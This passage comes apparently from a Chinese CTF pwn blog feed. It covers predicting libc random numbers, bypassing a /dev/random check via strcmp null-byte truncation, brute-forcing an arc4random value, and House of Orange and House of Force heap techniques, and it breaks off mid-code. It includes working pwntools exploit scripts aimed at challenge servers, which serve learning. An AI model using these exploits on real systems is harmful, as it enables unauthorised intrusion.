class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>下面是关于<code>localtime和tm_yday的解释</code></p><blockquote><h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timer = time(<span class="number">0LL</span>);</span><br></pre></td></tr></table></figure></div><ul><li><code>time(0LL)</code> 或者 <code>time(NULL)</code> 返回的是当前的 UNIX 时间戳（从 1970 年 1 月 1 日 00:00:00 UTC 到现在的秒数）。这个时间戳是一个 <code>time_t</code> 类型。</li><li><code>timer</code> 变量存储了当前的时间戳。</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = localtime(&amp;timer);</span><br></pre></td></tr></table></figure></div><ul><li><code>localtime(&amp;timer)</code> 将时间戳 <code>timer</code> 转换为本地时间，并返回一个指向 <code>struct tm</code> 结构体的指针。<code>struct tm</code> 包含了日期和时间的各个组成部分（年、月、日、时、分、秒等）。</li><li>v3是一个指向 <code>struct tm</code> 的指针，结构体中的一些字段包括：</li><li><code>tm_year</code>: 当前年（自 1900 年以来的年数）</li><li><code>tm_mon</code>: 当前月（从 0 到 11）</li><li><code>tm_mday</code>: 当前日</li><li><code>tm_yday</code>: 当前年中的第几天（从 0 到 365）</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srandom(v3-&gt;tm_yday);</span><br></pre></td></tr></table></figure></div><ul><li><code>srandom()</code> 是一个用于初始化随机数生成器的函数，类似于 <code>srand()</code>，但通常在某些系统中提供更强的随机性。它接收一个无符号整数作为种子，后续的随机数生成就基于这个种子。</li><li><code>v3-&gt;tm_yday</code> 是结构体 <code>tm</code> 中的一个字段，它表示当前日期在一年中的第几天（范围为 0 到 365）。这个值被用来作为种子。</li></ul></blockquote><ul><li>从本地时间中提取当前日期在一年中的第几天(tm_yday)作为随机数种子，算法是一样的模拟即可</li><li>后续代码不放出来了，还有两个随便输出什么都行，就可以获得flag了</li></ul><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctype <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf1 = cdll.LoadLibrary(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;192.168.119.52&quot;</span>,<span class="number">53889</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Let&#x27;s play a number guessing game.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">timer = <span class="built_in">int</span>(elf1.time(<span class="number">0</span>))</span><br><span class="line">tm = time.localtime(timer) </span><br><span class="line">day_of_year = tm.tm_yday-<span class="number">1</span> <span class="comment"># 这个加一很迷啊</span></span><br><span class="line">elf1.srandom(day_of_year)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>( (elf1.random()%<span class="number">90000</span>) + <span class="number">10000</span> ))</span><br><span class="line">    <span class="comment">#p.recvuntil(&quot;Wow, you are right!\n&quot;)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 下面随便输入什么都可以的</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;You only got two of them wrong, flag still for you.&quot;</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure></div><h1 id="什么是真随机"><a href="#什么是真随机" class="headerlink" title="什么是真随机"></a>什么是真随机</h1><ul><li><mark>真随机代表着我们无法通过libc去预测、模拟系统产生的随机数是多少<mark></mark></mark></li><li>下面模拟一个真随机数产生的过程：</li></ul><h2 id="dev-random获得随机数"><a href="#dev-random获得随机数" class="headerlink" title="&#x2F;dev&#x2F;random获得随机数"></a><mark>&#x2F;dev&#x2F;random获得随机数<mark></mark></mark></h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/dev/random&quot;</span> , O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">&quot;Error open /dev/random&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> num;</span><br><span class="line"><span class="type">ssize_t</span> result = read(fd, &amp;num , <span class="keyword">sizeof</span>(num));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Random num is : %u\n&quot;</span>, num );</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>产生的结果如下：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu24<span class="number">.04</span>: Random num <span class="keyword">is</span> : <span class="number">2697870537</span></span><br><span class="line">ubuntu22<span class="number">.04</span>: Random num <span class="keyword">is</span> : <span class="number">2754856894</span></span><br></pre></td></tr></table></figure></div><p>即使libc相同，但是产生的随机数还是不相同的，下面来了解一下&#x2F;dev&#x2F;random产生随机数的原理</p><blockquote><p>通过 <code>/dev/random</code> 获取随机数的原理涉及到操作系统的随机数生成机制。<code>/dev/random</code> 是 Linux 和类 Unix 操作系统中的一个设备文件，专门用于生成加密级别的高质量随机数。其工作原理如下：</p><h3 id="1-熵池的概念"><a href="#1-熵池的概念" class="headerlink" title="1. 熵池的概念"></a>1. <strong>熵池的概念</strong></h3><ul><li><code>/dev/random</code> 使用熵（entropy）来生成随机数。熵是系统中不可预测事件的来源，比如键盘输入、鼠标移动、硬盘访问时间等。这些事件的特性难以预测，因此可以作为随机数生成的来源。</li><li>操作系统维护一个“熵池”，即收集和存储这些不可预测事件产生的数据。当系统收集到足够的熵时，就可以利用这些数据生成高质量的随机数。</li></ul><h3 id="2-工作流程"><a href="#2-工作流程" class="headerlink" title="2. 工作流程"></a>2. <strong>工作流程</strong></h3><ul><li>当程序读取 <code>/dev/random</code> 时，操作系统会从熵池中提取熵，并使用某种加密安全的伪随机数生成器（CSPRNG）来输出随机数据。</li><li>当熵池中的熵不足时（即系统中没有足够的随机事件发生），读取 <code>/dev/random</code> 会阻塞（等待），直到收集到足够的熵。因此，<code>/dev/random</code> 适合需要高安全性、高随机性的应用场景，比如生成加密密钥。</li></ul><h3 id="3-阻塞和非阻塞"><a href="#3-阻塞和非阻塞" class="headerlink" title="3. 阻塞和非阻塞"></a>3. <strong>阻塞和非阻塞</strong></h3><ul><li><code>/dev/random</code> 是阻塞的。当熵池耗尽时，程序会被迫等待，直到系统收集到足够的熵为止，这可能导致延迟。</li><li>对应的非阻塞版本是 <code>/dev/urandom</code>。<code>/dev/urandom</code> 也使用熵池，但在熵耗尽时不会阻塞，而是继续使用伪随机数生成器生成随机数。虽然这减少了阻塞问题，但在某些极端安全要求下，使用 <code>/dev/random</code> 会更好。</li></ul><h3 id="4-常用场景"><a href="#4-常用场景" class="headerlink" title="4. 常用场景"></a>4. <strong>常用场景</strong></h3><ul><li><code>/dev/random</code> 主要用于加密操作、密钥生成、会话标识符等需要高随机性、无法预测的场景。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过 <code>/dev/random</code> 获取随机数的核心原理在于熵的采集与使用。系统不断从硬件和系统事件中收集不可预测的行为作为熵来生成随机数，确保生成的数具有高不可预测性，适用于高安全需求的场合。</p></blockquote><ul><li>&#x2F;dev&#x2F;random通过熵值来获取随机数，而熵值是不可预测的，并且是由于很多因素造成的，因此也造成了它的真随机性，但是我们可以用爆破来求出随机数。</li></ul><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p>题目：<code>buildctf real_random</code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  my_init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    get_random(s2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input your text: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Congratulations!!!&quot;</span>);</span><br><span class="line">      getshell();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No,guess again!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>get_random</code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">get_random</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/dev/random&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to open the file!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, a1, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>很明显的<code>/dev/random</code>的真随机，但是难道就没有漏洞了吗？其实不然</li><li><code>strcmp</code>关键就在这个函数，遇到<code>\x00</code>就会停止比较，那么我们传入一个p64(0)，只要随机数的首字节是\x00，就会比较成功，并且极大的缩短了比较时间。</li></ul><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;27.25.151.80&quot;</span>,<span class="number">37097</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9999</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;please input your text: &quot;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    rev = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    success(<span class="string">f&quot;第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>次,recv<span class="subst">&#123;<span class="built_in">str</span>(rev)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Congratulations!!!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><h2 id="arc4random"><a href="#arc4random" class="headerlink" title="arc4random"></a>arc4random</h2><blockquote><p><strong><code>arc4random()</code> 函数</strong>：</p><ul><li><code>arc4random()</code> 是一个用于生成随机数的函数，常见于 BSD 系统，它基于一个称为 ARC4 的加密算法实现。</li><li>这个函数不需要任何输入参数，直接返回一个伪随机数，通常是一个 <code>32-bit</code> 的无符号整数。</li></ul></blockquote><ul><li>基本的用法：</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 无需seed直接生成随机数</span></span><br><span class="line">    <span class="type">uint32_t</span> random_number = arc4random();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Random number: %u\n&quot;</span>, random_number);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h3><p><code>moectf2024 Catch_the_canary!</code></p><ul><li>只看随机数部分：</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v3 = arc4random(argc, argv, envp);</span><br><span class="line">v4 = v3 - <span class="number">0xFEFFFFFFFFFFFF</span>LL * ((__int64)((<span class="number">0x4040404040404081</span>LL * (<span class="type">unsigned</span> __int128)v3) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">54</span>);</span><br><span class="line"></span><br><span class="line">v8 = (<span class="type">unsigned</span> <span class="type">int</span>)arc4random(argc, <span class="number">0LL</span>, v4) % <span class="number">0x2345</span> + <span class="number">16768186</span>;</span><br><span class="line">init();</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Here, my canary, with a cage.\n&quot;</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;[Info] Password required.\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line"><span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v6) == <span class="number">-1</span> || v8 != v6 )</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;[Error] Wrong! Try again.\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;[Info] Cage opened.\n&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Oh, but I&#x27;ve got \&quot;cageincage\&quot;\nwhich is impossible to open.\nOne shot.\n&quot;</span>, <span class="number">0x45</span>uLL);</span><br></pre></td></tr></table></figure></div><ul><li>产生的是一个固定的随机数，所以我们只需要爆破即可：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;required.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFFDCBA</span>,<span class="number">0xFFDCBA</span>+<span class="number">0x2345</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">    rev = p.recvuntil(<span class="string">b&#x27;] &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rev:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House_Of_Orange</title>
      <link href="/2024/10/08/House-Of-Orange/"/>
      <url>/2024/10/08/House-Of-Orange/</url>
      
        <content type="html"><![CDATA[<p><strong>参考</strong>：</p><p><a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/">House of Orange - CTF Wiki (ctf-wiki.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h1><p><em><strong>house of orange 在于我们没有free的时候，一样可以达到free的效果，将一个chunk放进unsorted bin中，然后达到泄露libc的效果</strong></em></p><blockquote><p>操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p></blockquote><ul><li><strong>正常情况下malloc的执行过程</strong></li></ul><p>malloc调用位于libc.so中的__int_malloc函数，该函数中以此检查fastbin,small bins,unsorted bin,large bin，若这些都不满足，则在top chunk中找</p><ul><li><strong>top chunk也不满足</strong></li></ul><p>此时会执行sysmalloc分配chunk</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="type">void</span> *p = <span class="built_in">sysmalloc</span>(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        <span class="built_in">alloc_perturb</span> (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>但是堆分配有mmap和brk分配方式，<mark>我们要用brk的分配方式拓展chunk<mark>，这样，之前的top chunk就会放到unsorted bin中，这也就达到了house of orange的利用</mark></mark></p><h2 id="一些check"><a href="#一些check" class="headerlink" title="一些check"></a>一些check</h2><ul><li><strong>malloc的大小要小于mmp_.mmap_threshold</strong>(<mark>默认128k<mark>)</mark></mark></li><li>sysmalloc函数对top chunk size的check</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">assert</span>((old_top == <span class="built_in">initial_top</span>(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      <span class="built_in">prev_inuse</span>(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="type">unsigned</span> <span class="type">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure></div><p>简单来说，top chunk的size要大于等于MINSIZE,top chunk的结束地址必须是页对其的，top chunk相邻的前一个chunk必须处于inuse状态。</p><p><font size="4" color="red">总结一下check</font></p><blockquote><p> <mark>伪造的size必须页对其<mark></mark></mark></p><p> <mark>size要大于MINSIZE(0x10)<mark></mark></mark></p><p> <mark>size要小于之后申请的chunk size + MINSIZE<mark></mark></mark></p><p> <mark>size的prev inuse位必须是1<mark></mark></mark></p><p>然后top chunk就会执行_int_free进入unsorted bin中</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House_Of_Force</title>
      <link href="/2024/09/26/House-Of-Force/"/>
      <url>/2024/09/26/House-Of-Force/</url>
      
        <content type="html"><![CDATA[<h1 id="提要"><a href="#提要" class="headerlink" title="提要"></a>提要</h1><p>参考文章：<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/#_2">ctfwiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><strong>神奇的泄露libc:通过malloc大于top chunk size的chunk，泄露出的chunk地址与libc存在固定的偏移</strong></p><h1 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h1><h2 id="运用条件"><a href="#运用条件" class="headerlink" title="运用条件"></a>运用条件</h2><ul><li><font color="red">可以修改top chunk的size大小</font></li><li><font color="red">可以控制分配任意大小的chunk</font></li></ul><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>当我们malloc的时候，若是空闲的堆块无法满足malloc的要求，就会从top chunk中分割合适的chunk</p><ul><li><strong>如果top chunk的分配的size是由我们控制，那么我们可以造成任意地址写</strong></li></ul><p>但是这里涉及到top chunk size的验证：</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = <span class="built_in">chunksize</span>(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="comment">// 注意size是一个无符号整型</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    <span class="built_in">set_head</span>(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">check_malloced_chunk</span>(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">chunk2mem</span>(victim);</span><br><span class="line">    <span class="built_in">alloc_perturb</span>(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>要绕过第一个验证很简单，只需要将size修改为一个很大的数字就行了，如0xffffffffffff,这也是利用条件1的必要性</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure></div><ul><li><p>上述代码实现了更新top chunk的指针， 我们只要控制分配的size,就可以实现任意地址写了。</p></li><li><p>其余的看开头文章，注意一个对齐规则。</p></li></ul><h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><p><a class="link" href="https://buuoj.cn/challenges#gyctf_2020_force">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h3><p><font size="4"><strong>main</strong></font></p><ul><li>只有一个add功能</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 